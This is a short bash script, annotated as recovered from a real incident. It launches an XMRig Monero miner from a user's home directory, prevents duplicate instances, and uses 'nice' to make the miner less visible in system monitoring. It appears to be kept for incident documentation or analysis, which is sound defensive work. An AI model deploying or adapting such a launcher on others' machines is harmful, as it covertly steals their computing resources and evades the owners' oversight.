#!/bin/bash
# ===========================================================================
# FROM REAL INCIDENT — launcher script for XMRig cryptominer
# Found at: /home/restudio/moneroocean/miner.sh
#
# This script was used to start the miner while preventing duplicate
# instances. The 'nice' command lowers CPU priority to make the miner
# less visible in system monitoring.
# ===========================================================================

if ! pidof xmrig >/dev/null; then
  nice /home/restudio/moneroocean/xmrig $*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
fi
